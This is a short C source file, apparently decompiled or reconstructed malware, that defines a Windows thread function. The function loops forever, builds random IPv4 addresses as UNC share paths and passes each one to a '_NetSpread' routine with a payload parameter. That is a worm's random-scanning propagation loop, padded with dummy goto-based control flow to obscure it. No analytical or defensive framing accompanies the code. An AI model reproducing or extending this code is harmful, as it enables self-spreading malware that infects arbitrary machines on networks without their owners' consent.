#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI extra(LPVOID Data)
{
    volatile int dummy_state = 1;
    DWORD tick_count;
    int rand_val1, rand_val2, rand_val3, rand_val4;
    char local_5c[64];
    LPCSTR param_1 = (LPCSTR)Data;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    tick_count = GetTickCount();
    srand(tick_count);
    memset(local_5c, 0, sizeof(local_5c));
    rand_val1 = rand() % 0x100;
    rand_val2 = rand() % 0x100;
    rand_val3 = rand() % 0x100;
    rand_val4 = rand() % 0x100;
    sprintf(local_5c, "\\\\%d.%d.%d.%d", rand_val4, rand_val3, rand_val2, rand_val1);
    _NetSpread((uint32_t)local_5c, param_1);
    dummy_state = 1;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
